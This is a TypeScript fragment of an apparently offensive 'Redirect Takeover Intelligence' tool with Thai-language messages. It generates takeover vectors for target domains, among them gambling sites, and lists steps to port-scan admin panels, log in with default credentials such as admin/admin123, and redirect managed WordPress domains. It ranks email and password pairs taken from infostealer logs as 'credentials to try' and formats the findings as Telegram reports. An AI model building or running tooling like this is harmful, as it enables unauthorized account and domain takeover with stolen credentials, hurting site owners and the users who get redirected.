      successProbability: isIdnDomain ? 55 : 40, // Higher for IDN gambling sites
      difficulty: "medium",
      credentialsToTry: rmsCreds,
      steps: [
        `Port scan ${destDomain} สำหรับ admin panel (8080, 8888, 3000, etc.)`,
        "ลอง login ด้วย default credentials (admin/admin123, root/root123)",
        "ถ้า login สำเร็จ → List managed WordPress sites",
        `หา ${destDomain} ใน managed sites`,
        "เปลี่ยน domain + เปิด redirect_old_domain",
      ],
    });
  }
  
  return vectors;
}

// ═══════════════════════════════════════════════════════
//  FINALIZE
// ═══════════════════════════════════════════════════════

function finalize(result: TakeoverIntelResult): TakeoverIntelResult {
  // Build summary
  const parts: string[] = [];
  
  if (result.redirectChain.length > 0) {
    parts.push(`Chain: ${result.redirectChain.length} hops`);
  }
  if (result.shortUrls.length > 0) {
    parts.push(`Short URLs: ${result.shortUrls.map(s => s.service).join(", ")}`);
  }
  if (result.platform) {
    parts.push(`Platform: ${result.platform.platform} (${result.platform.confidence}%)`);
  }
  parts.push(`Credentials: ${result.allCredentials.length} total`);
  parts.push(`Vectors: ${result.takeoverVectors.length}`);
  if (result.topVector) {
    parts.push(`Top: ${result.topVector.name} (~${result.topVector.successProbability}%)`);
  }
  
  result.summary = parts.join(" | ");
  return result;
}

// ═══════════════════════════════════════════════════════
//  TELEGRAM FORMATTER
// ═══════════════════════════════════════════════════════

export function formatTakeoverIntelForTelegram(result: TakeoverIntelResult): string {
  let msg = `🕵️ Redirect Takeover Intelligence\n`;
  msg += `🎯 Target: ${result.domain}${result.targetUrl ? ` (${result.targetUrl})` : ""}\n`;
  msg += `━━━━━━━━━━━━━━━━━━━━\n\n`;
  
  // Redirect Chain
  if (result.redirectChain.length > 0) {
    msg += `🔗 Redirect Chain (${result.redirectChain.length} hops):\n`;
    for (let i = 0; i < result.redirectChain.length; i++) {
      const hop = result.redirectChain[i];
      const prefix = i === result.redirectChain.length - 1 ? "└─" : "├─";
      const shortLabel = hop.isShortUrl ? " 🔗" : "";
      const statusLabel = hop.redirectType !== "none" ? ` [${hop.statusCode}]` : " 🏁";
      msg += `   ${prefix} ${extractDomain(hop.url)}${statusLabel}${shortLabel}\n`;
    }
    msg += `\n`;
  }
  
  // Platform Detection
  if (result.platform) {
    msg += `🏗️ Platform: ${result.platform.platform} (${result.platform.confidence}% confidence)\n`;
    if (result.platform.ownerIdentifiers.length > 0) {
      msg += `   📋 Owner IDs:\n`;
      for (const id of result.platform.ownerIdentifiers.slice(0, 5)) {
        msg += `   • ${id.type}: ${id.value.substring(0, 40)}${id.value.length > 40 ? "..." : ""}\n`;
      }
    }
    if (result.platform.platformCredentials.length > 0) {
      msg += `   🔑 Platform creds: ${result.platform.platformCredentials.length} found\n`;
    }
    msg += `\n`;
  }
  
  // Short URL Analysis
  if (result.shortUrls.length > 0) {
    msg += `🔗 Short URL Analysis:\n`;
    for (const su of result.shortUrls) {
      msg += `   📎 ${su.service}: ${su.shortUrl}\n`;
      if (su.destination) {
        msg += `   └─ → ${extractDomain(su.destination)}\n`;
      }
      msg += `   └─ Stealer creds: ${su.stealerCredentials.length}`;
      if (su.stealerCredentials.length > 0) {
        const relevant = su.stealerCredentials.filter(c => c.relevanceScore >= 5);
        msg += ` (${relevant.length} relevant)`;
      }
      msg += `\n`;
      msg += `   └─ Difficulty: ${su.takeoverDifficulty}\n`;
    }
    msg += `\n`;
  }
  
  // Credentials Summary
  const totalCreds = result.allCredentials.length;
  const relevantCreds = result.allCredentials.filter(c => c.relevanceScore >= 5);
  msg += `🔑 Credentials: ${totalCreds} total, ${relevantCreds.length} relevant\n`;
  if (relevantCreds.length > 0) {
    msg += `   Top candidates:\n`;
    for (const c of relevantCreds.slice(0, 5)) {
      const masked = c.password.length > 3
        ? c.password.substring(0, 2) + "***" + c.password.substring(c.password.length - 1)
        : "***";
      msg += `   • ${c.email} [${masked}] (score: ${c.relevanceScore})\n`;
    }
  }
  msg += `\n`;
  
  // Takeover Vectors
  if (result.takeoverVectors.length > 0) {
    msg += `━━━━━━━━━━━━━━━━━━━━\n`;
    msg += `🎯 Takeover Vectors (${result.takeoverVectors.length}):\n\n`;
    for (const v of result.takeoverVectors.slice(0, 5)) {
      const emoji = v.successProbability >= 50 ? "🟢" : v.successProbability >= 25 ? "🟡" : "🔴";
      const diffEmoji = { easy: "⚡", medium: "⚙️", hard: "🔧", expert: "🧠" }[v.difficulty];
      msg += `${emoji} ${v.name} (~${v.successProbability}%) ${diffEmoji}\n`;
      msg += `   ${v.description}\n`;
      if (v.credentialsToTry.length > 0) {
        msg += `   🔑 ${v.credentialsToTry.length} credentials to try\n`;
      }
      msg += `   📋 Steps:\n`;
      for (const step of v.steps.slice(0, 3)) {
        msg += `      • ${step}\n`;
      }
      if (v.steps.length > 3) msg += `      ... +${v.steps.length - 3} more\n`;
      msg += `\n`;
    }
  } else {
    msg += `⚠️ ไม่พบ takeover vector ที่เป็นไปได้\n\n`;
  }
  
  msg += `⏱️ Analysis: ${(result.scanDuration / 1000).toFixed(1)}s`;
  return msg;
}
